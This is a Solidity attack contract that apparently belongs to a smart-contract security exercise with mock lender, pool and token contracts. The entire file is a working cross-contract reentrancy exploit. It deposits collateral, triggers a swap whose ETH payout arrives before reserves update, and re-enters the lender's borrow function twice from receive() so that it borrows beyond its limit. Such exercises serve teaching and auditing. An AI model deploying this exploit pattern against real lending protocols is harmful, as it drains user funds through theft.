// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {OracleLender} from "../src/OracleLender.sol";
import {SimplePool} from "../src/SimplePool.sol";
import {MockERC20} from "../src/MockERC20.sol";

contract CrossReentrancyAttack {
    OracleLender public lender;
    SimplePool public pool;
    MockERC20 public token;
    uint256 public reentered;

    constructor(address _lender, address _pool, address _token) {
        lender = OracleLender(_lender);
        pool = SimplePool(_pool);
        token = MockERC20(_token);
    }

    function pwn() external {
        token.approve(address(lender), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        // 1. Deposit 500,000 tokens as collateral (maxBorrow = 25 ETH at current price)
        lender.deposit(500_000e18);
        // 2. Swap 1,000,000 tokens: pool sends ~50 ETH to us BEFORE updating reserves
        pool.swapTokenToEth(1_000_000e18);
    }

    receive() external payable {
        // Pool callback (first ETH send) → borrow in inconsistent pool state
        // Vault callback (second ETH send) → borrow again, debt still 0 → passes
        if (reentered < 2) {
            reentered++;
            lender.borrow(25 ether);
        }
    }
}